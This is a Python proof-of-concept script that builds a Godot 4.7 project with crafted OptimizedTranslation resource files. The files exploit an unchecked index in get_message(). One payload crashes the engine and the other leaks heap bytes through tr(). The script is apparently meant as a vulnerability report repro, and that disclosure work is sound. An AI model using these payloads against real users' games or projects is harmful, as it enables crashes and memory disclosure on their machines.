#!/usr/bin/env python3
"""
Repro generator for the OptimizedTranslation::get_message OOB read in Godot 4.7.

Writes a minimal Godot project under ./proj/ that crashes a STOCK binary (editor
or exported game) when a single tr() call is made. No engine compilation required.

The vulnerability lives in core/string/optimized_translation.cpp, get_message():

    uint32_t p = htptr[h % htsize];                      // p read from attacker data
    if (p == 0xFFFFFFFF) { return StringName(); }         // only the sentinel is rejected
    const Bucket &bucket = *(const Bucket *)&btptr[p];    // p used as raw index, NO bounds check
    h = hash(bucket.func, str.get_data());                // immediate OOB dereference

The three backing arrays (hash_table, bucket_table, strings) are written verbatim
from the resource file by _set() with zero validation, so any loaded .tres fully
controls them.

Two payloads are produced:

  bad_translation.tres   -- hard crash. hash_table[0] = 0x40000000, so the engine
                            forms &btptr[0x40000000] (~4 GiB past the 2-int allocation)
                            and dereferences it -> access violation / SIGSEGV.

  leak_translation.tres  -- in-range p with a crafted bucket. elem[0].str_offset
                            points past the `strings` buffer, so tr() RETURNS leaked
                            heap bytes. Best observed under ASan or Windows PageHeap.

Usage:
    python make_repro.py
"""

import os

HERE = os.path.dirname(os.path.abspath(__file__))
PROJ = os.path.join(HERE, "proj")

# FNV-style hash used by OptimizedTranslation (optimized_translation.h::hash()).
FNV = 0x1000193

# Query string used for the info-leak variant.  For the crash variant any
# string works because htsize == 1, so h % htsize == 0 for every query.
QUERY = "LEAK_ME"


def godot_hash(d: int, s: str) -> int:
    """Replicate OptimizedTranslation::hash(d, utf8(s)) from optimized_translation.h:74."""
    if d == 0:
        d = FNV
    for ch in s.encode("utf-8"):
        d = ((d * FNV) & 0xFFFFFFFF) ^ ch
        d &= 0xFFFFFFFF
    return d & 0xFFFFFFFF


def i32(u: int) -> int:
    """Re-encode a uint32 bit-pattern as the signed int32 the .tres parser stores.
    PackedInt32Array holds int32; the engine reinterprets the bits as uint32."""
    u &= 0xFFFFFFFF
    return u - 0x100000000 if u >= 0x80000000 else u


def packed_int32(values):
    return "PackedInt32Array(" + ", ".join(str(i32(v)) for v in values) + ")"


def packed_bytes(values):
    if not values:
        return "PackedByteArray()"
    return "PackedByteArray(" + ", ".join(str(b & 0xFF) for b in values) + ")"


def write(path: str, text: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(text)
    print("  wrote", os.path.relpath(path, HERE))


# ---------------------------------------------------------------------------
# Payload 1 — bucket_table OOB -> hard crash
# ---------------------------------------------------------------------------
# hash_table has ONE slot, so h % htsize == 0 for any query string.
# p = hash_table[0] = 0x40000000.  p != 0xFFFFFFFF, so the sentinel check passes
# and the engine executes: const Bucket &bucket = *(const Bucket *)&btptr[0x40000000];
# byte offset = 0x40000000 * 4 = 4 GiB past a 2-int (8-byte) allocation -> SIGSEGV.
def build_crash_tres() -> str:
    hash_table   = [0x40000000]   # attacker-chosen out-of-bounds bucket index
    bucket_table = [0, 0]         # tiny allocation; the index reaches ~4 GiB past it
    strings      = []
    return (
        '[gd_resource type="OptimizedTranslation" format=3]\n\n'
        "[resource]\n"
        'locale = "en"\n'
        "hash_table = "   + packed_int32(hash_table)   + "\n"
        "bucket_table = " + packed_int32(bucket_table) + "\n"
        "strings = "      + packed_bytes(strings)      + "\n"
    )


# ---------------------------------------------------------------------------
# Payload 2 — strings OOB -> info-leak (tr() returns out-of-bounds heap bytes)
# ---------------------------------------------------------------------------
# Keep p == 0 (in range) so the bucket is read from the start of bucket_table.
# Craft one Elem whose key matches the query hash so the lookup "succeeds", but
# whose str_offset points far past the end of `strings`.
# get_message() then executes: return String::utf8(&sptr[str_offset], uncomp_size)
# reading LEAK_LEN bytes from beyond the heap allocation and returning them as
# the tr() result — those bytes reach the caller (and potentially game UI/logs).
LEAK_LEN   = 64     # bytes read past the end of `strings` and returned by tr()
STR_OFFSET = 4096   # how far past `strings` to start reading


def build_leak_tres() -> str:
    func = 0                          # bucket.func; hash(0, x) seeds d = FNV
    key  = godot_hash(func, QUERY)    # must equal hash(func, QUERY) to pass line 266

    # Flat bucket_table layout consumed by get_message() (optimized_translation.h Bucket):
    #   [0] bucket.size         = 1
    #   [1] bucket.func         = func
    #   [2] elem[0].key         = key
    #   [3] elem[0].str_offset  = STR_OFFSET  (far past end of `strings`)
    #   [4] elem[0].comp_size   = LEAK_LEN
    #   [5] elem[0].uncomp_size = LEAK_LEN    (== comp_size -> uncompressed path, line 276)
    bucket_table = [1, func, key, STR_OFFSET, LEAK_LEN, LEAK_LEN]
    hash_table   = [0]                # htsize 1 -> p = bucket_table index 0 (in range)
    strings      = list(b"godot")     # small real allocation to read past

    return (
        '[gd_resource type="OptimizedTranslation" format=3]\n\n'
        "[resource]\n"
        'locale = "en"\n'
        "hash_table = "   + packed_int32(hash_table)   + "\n"
        "bucket_table = " + packed_int32(bucket_table) + "\n"
        "strings = "      + packed_bytes(strings)      + "\n"
    )


# ---------------------------------------------------------------------------
# Minimal Godot project files
# ---------------------------------------------------------------------------

def build_main_scene() -> str:
    return (
        '[gd_scene format=3]\n'
        '\n'
        '[node name="Main" type="Node"]\n'
    )


def build_project_godot() -> str:
    return (
        '; Engine configuration file.\n'
        '[application]\n'
        'config/name="OptimizedTranslation OOB repro"\n'
        'config/main_scene="res://main.tscn"\n'
        '\n'
        '[autoload]\n'
        'Trigger="*res://trigger.gd"\n'
    )


def build_trigger_gd() -> str:
    return (
        'extends Node\n'
        '\n'
        '# Change to "leak" to run the info-leak variant instead of the crash.\n'
        'const VARIANT = "crash"\n'
        '\n'
        'func _ready():\n'
        '\tvar fname = "bad_translation.tres" if VARIANT == "crash" else "leak_translation.tres"\n'
        '\tvar t: Translation = ResourceLoader.load("res://" + fname)\n'
        '\tTranslationServer.add_translation(t)\n'
        '\tTranslationServer.set_locale("en")\n'
        '\t# Any tr() call dispatches to OptimizedTranslation::get_message().\n'
        '\t# Crash variant:  process faults inside get_message() before reaching the print below.\n'
        '\t# Leak variant:   get_message() reads 64 bytes past the strings buffer and returns them.\n'
        '\t#                 On a stock binary the bytes may be null/non-printable -> appears empty.\n'
        '\t#                 Run under ASan or Windows PageHeap to see the explicit OOB READ report.\n'
        '\tvar result = tr("LEAK_ME")\n'
        '\tprint("tr() returned %d bytes: %s" % [result.length(), result.to_utf8_buffer()])\n'
        '\tprint("Execution reached end of _ready() (expected for leak variant; crash variant faults above).")\n'
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("Writing repro project to:", PROJ)
    os.makedirs(PROJ, exist_ok=True)

    write(os.path.join(PROJ, "bad_translation.tres"),  build_crash_tres())
    write(os.path.join(PROJ, "leak_translation.tres"), build_leak_tres())
    write(os.path.join(PROJ, "project.godot"),         build_project_godot())
    write(os.path.join(PROJ, "main.tscn"),             build_main_scene())
    write(os.path.join(PROJ, "trigger.gd"),            build_trigger_gd())

    print()
    print("Step 1 — open the project in the Godot 4.7 editor:")
    print(f'  Godot_v4.7.exe --editor "{PROJ}"')
    print()
    print("Step 2 — run the project (F5 or the play button).")
    print("  Expected (crash variant): access violation / SIGSEGV inside get_message()")
    print("  Under ASan / PageHeap:    heap-buffer-overflow READ at optimized_translation.cpp:259")
    print()
    print("For the info-leak variant:")
    print("  Edit proj/trigger.gd: set VARIANT = \"leak\"")
    print("  Run under AddressSanitizer or Windows PageHeap to see the out-of-bounds READ report.")
    print("  On a stock binary without instrumentation tr() returns raw heap bytes; print() shows them.")


if __name__ == "__main__":
    main()
